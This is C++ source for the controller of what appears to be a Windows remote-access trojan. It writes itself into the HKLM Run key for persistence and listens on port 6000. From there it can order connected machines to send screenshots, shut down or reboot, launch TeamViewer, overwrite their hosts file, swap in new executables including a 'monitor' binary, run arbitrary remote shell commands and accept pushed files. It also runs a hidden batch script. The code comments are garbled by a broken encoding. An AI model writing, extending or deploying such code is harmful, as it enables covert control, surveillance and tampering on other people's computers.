#include <stdio.h>
#include <WinSock2.h>
#include <fstream>
#include <string>
#include <iostream>
using namespace std;
#pragma comment(lib, "ws2_32.lib")

LONG addreg(char *p){
	HKEY hkey;
	LONG ReturnNum;
	DWORD dwType = REG_SZ;
	DWORD dwSize;
	dwSize=strlen(p);
	char name[12] = "IPServer";//���·����
	//��ӿ��������ע���
	ReturnNum=RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,KEY_ALL_ACCESS|KEY_WOW64_32KEY,&hkey);

	if(ReturnNum!=0)
		return -1;
	LONG lResult = RegSetValueExA(hkey, name,(DWORD)0,dwType, (BYTE*)p,dwSize);

	RegCloseKey(hkey);
	return lResult;
}

int main()
{
	char ExePlace[1024];/*�����ַ������*/
	char ExeDir[1024] = {0};
	GetModuleFileNameA(0,ExePlace,1024);/*��ȡ��ǰ����ȫ·��*/
	puts(ExePlace);/*�����ȡ����·��*/
	addreg(ExePlace);

	HWND hWnd = FindWindowA("ConsoleWindowClass",ExePlace);
	char *p = strrchr(ExePlace, '\\');
	memcpy(ExeDir, ExePlace, strlen(ExePlace)-strlen(p));

	//�����׽��ֿ�
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1,1);

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return -1;
	}

	if(LOBYTE(wsaData.wVersion) != 1
		|| HIBYTE(wsaData.wVersion) != 1){
			WSACleanup();

			return -1;
	}

	//�������ڼ������׽���
	SOCKET sockSrv = socket(AF_INET, SOCK_STREAM, 0);

	int port = 6000;
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(port);

	printf("Start Service port:%d\n", port);
	//���׽���
	bind(sockSrv, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
	//���׽�����Ϊ����ģʽ��׼�����ܿͻ�����
	listen(sockSrv, 5);

	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);
	
	while(1){
		//�ȴ��ͻ�������
		SOCKET sockConn = accept(sockSrv, (SOCKADDR*)&addrClient, &len);

		char sendBuf[100];
		int nLen = 0;
		char recvbuf[100];
// 		sprintf_s(sendBuf, "Welcome %s to visit my computer!",
// 			inet_ntoa(addrClient.sin_addr));
// 		//��������
// 		int nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
		
		//��������
// 		memset(recvbuf, 0, 100);
// 		nLen = recv(sockConn, recvbuf, 100, 0);
// 		//��ӡ����
// 		if (nLen > 1)
// 			printf("client: %s. (%d r)\n", recvbuf, nLen);

		char c = getchar();
		switch(c)
		{
		case 'h':
			{
printf("=====================================\n\
h:��ȡ����\n\
i:��ȡ�ͻ���IP\n\
u:���¿ͻ���ipclient���\n\
p:��ȡ�ͻ��˽�ͼ\n\
s:�رտͻ��˵���\n\
r:�����ͻ��˵���\n\
c:�����ͻ��˵��Ե�teamviewer\n\
o:���¿ͻ���host�ļ�\n\
m:���¿ͻ���monitor���\n\
b:Զ��ִ��bat����\n\
t:Զ�̴����ļ����ͻ���\n\
 =========================================\n");
			}
			break;
		case 'i'://��Ҫ��ȡIP��Ϣ
			{
				//��������
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","i");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(200);

				//��������
				memset(recvbuf, 0, 100);
				nLen = recv(sockConn, recvbuf, 100, 0);
				//��ӡ����
				printf("client: %s. (%d r)\n", recvbuf, nLen);
				printf("service: Client Ip is %s.\n", inet_ntoa(addrClient.sin_addr));

			}
			break;
		case 'p'://��Ҫ��ȡ��ͼ
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","p");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				//Sleep(200);

				//��������
				memset(recvbuf, 0, 100);
				nLen = recv(sockConn, recvbuf, 100, 0);
				if (strcmp(recvbuf, "SendImage") == 0)
				{
					Sleep(100);
					int nImageSize = 0;
					memset(recvbuf, 0, 100);
					nLen = recv(sockConn, recvbuf, 100, 0);
					if (nLen > 0)
					{
						nImageSize = atoi(recvbuf);
					}
					BYTE* imageData = new BYTE[nImageSize];
					if (!imageData)
					{
						break;
					}
					nLen = recv(sockConn, (char*)imageData, nImageSize, 0);

					FILE *fp = fopen(".\\abc.bmp", "w+b"); 
					if (!fp)
					{
						break;
					}
					fwrite(imageData, 1, nImageSize, fp);
					fclose(fp);

					if (imageData)
					{
						delete[] imageData;
						imageData = NULL;
					}

					//�Զ��򿪵�ǰ��ͼƬ
  					char cCMD[400] = {0};
					ofstream outCmd = ofstream(".\\killRundll32.bat");
					sprintf_s(cCMD, 
						"%s\\abc.bmp\n\
						ping -n 6 127.0.0.1>nul\n\
						taskkill /im rundll32.exe\n", ExeDir);
					outCmd.write(cCMD, strlen(cCMD));
					outCmd.close();

					memset(cCMD, 0 ,400);
					sprintf_s(cCMD, "/C %s\\killRundll32.bat", ExeDir);
					HINSTANCE iErr = ShellExecuteA(hWnd, "open", "cmd.exe", 
						cCMD, NULL, SW_HIDE);
					memset(cCMD, 0 ,400);
					sprintf_s(cCMD, "error = %d\n", (int)iErr);
					printf(cCMD);
				}
			}
			break;
		case 's'://�رյ���
			{
				//��������
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","s");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(200);
			}
			break;
		case 'r'://��������
			{
				//��������
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","r");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(200);
			}
			break;
		case 'u'://�������
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","u");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);
				//��������
				char* byFileData = NULL;
				ifstream in = ifstream(".\\IPClient.exe", ios_base::binary);
				if (!in)
				{
					break;
				}
				in.seekg(0, ios_base::end);//���ļ�ָ��ֱ���ƶ������һλ
				int size = in.tellg();
				if (size == -1)
				{
					break;
				}

				char cDataSize[40] = {0};
				sprintf_s(cDataSize, "%d", size);
				nLen = send(sockConn, cDataSize, strlen(cDataSize), 0);
				Sleep(2000);
				byFileData = new char[size];
				if(!byFileData)
					break;
				in.seekg(0, ios_base::beg);//�ƶ��ļ�ͷ����ȡ����
				in.read(byFileData, size);
				in.close();
				nLen = send(sockConn, byFileData, size, 0);
				Sleep(1);
				if (byFileData)
				{
					delete byFileData;
					byFileData = NULL;
				}

				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
				Sleep(100);
			}
			break;
		case 'c'://��teamview�������
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","c");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);

				char cDataSize[40] = {0};
				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
			}
			break;
		case 'o'://����host���ļ�h
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","h");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);
			}
			break;
		case 'm'://�������
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","m");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(10);
				//��������
				char* byFileData = NULL;
				ifstream in = ifstream(".\\iGoogleM.exe", ios_base::binary);
				if (!in)
				{
					break;
				}
				in.seekg(0, ios_base::end);//���ļ�ָ��ֱ���ƶ������һλ
				int size = in.tellg();
				if (size == -1)
				{
					break;
				}

				char cDataSize[40] = {0};
				sprintf_s(cDataSize, "%d", size);
				nLen = send(sockConn, cDataSize, strlen(cDataSize), 0);
				Sleep(2000);
				byFileData = new char[size];
				if(!byFileData)
					break;
				in.seekg(0, ios_base::beg);//�ƶ��ļ�ͷ����ȡ����
				in.read(byFileData, size);
				in.close();
				nLen = send(sockConn, byFileData, size, 0);
				Sleep(1);
				if (byFileData)
				{
					delete byFileData;
					byFileData = NULL;
				}

				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
				Sleep(100);
			}
			break;
		case 'b'://����host���ļ�h
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","b");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);

				printf("CMD>");
				while(TRUE)
				{
					char pCmd[200] = {0};
					string strCin;
					getline(cin, strCin);
					memcpy(pCmd, strCin.data(), strCin.size());
					if (strCin.size() <= 0)
					{
						continue;
					}
					nLen = send(sockConn, pCmd, strlen(pCmd)+1, 0);
					Sleep(100);
					
					if (strcmp(pCmd, "q") == 0)
					{
						break;
					}

					char* pRecvCmd = NULL;
					char nSize[100] = {0};
					recv(sockConn, nSize, 100, 0);

					if (pRecvCmd == NULL)
					{
						pRecvCmd = new char[atoi(nSize)+1];
						memset(pRecvCmd, 0, atoi(nSize)+1);
					}
					Sleep(100);

					recv(sockConn, pRecvCmd, atoi(nSize)+1, 0);
					printf(pRecvCmd);

					if (pRecvCmd)
					{
						delete pRecvCmd;
						pRecvCmd = NULL;
					}

					printf("CMD>");
					Sleep(10);
				}
				printf("\n");
			}
			break;
		case 't':
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","t");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(10);

				char pFileName[200] = {0};
				string strCin = "";
				while(strCin.size() <= 0)
				{
					getline(cin, strCin);
					if (strCin.size() <= 0)
					{
						continue;
					}
				}
				memcpy(pFileName, strCin.data(), strCin.size());
				nLen = send(sockConn, pFileName, strlen(pFileName), 0);
				if(nLen <= 0)
					break;

				char pFileNamePath[200] = {0};
				sprintf_s(pFileNamePath, "%s\\%s", ExeDir, pFileName);
				Sleep(1000);
				//��������
				char* byFileData = NULL;
				ifstream in = ifstream(pFileName, ios_base::binary);
				if (!in)
				{
					break;
				}
				in.seekg(0, ios_base::end);//���ļ�ָ��ֱ���ƶ������һλ
				int size = in.tellg();
				if (size == -1)
				{
					break;
				}

				char cDataSize[40] = {0};
				sprintf_s(cDataSize, "%d", size);
				nLen = send(sockConn, cDataSize, strlen(cDataSize), 0);
				Sleep(2000);
				byFileData = new char[size];
				if(!byFileData)
					break;
				in.seekg(0, ios_base::beg);//�ƶ��ļ�ͷ����ȡ����
				in.read(byFileData, size);
				in.close();
				nLen = send(sockConn, byFileData, size, 0);
				Sleep(1);
				if (byFileData)
				{
					delete byFileData;
					byFileData = NULL;
				}

				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
				Sleep(100);
			}
			break;
		default:
			break;
		}
		
		//�ر��׽���
		closesocket(sockConn);
	}
	closesocket(sockSrv);
	WSACleanup();
	return 0;
}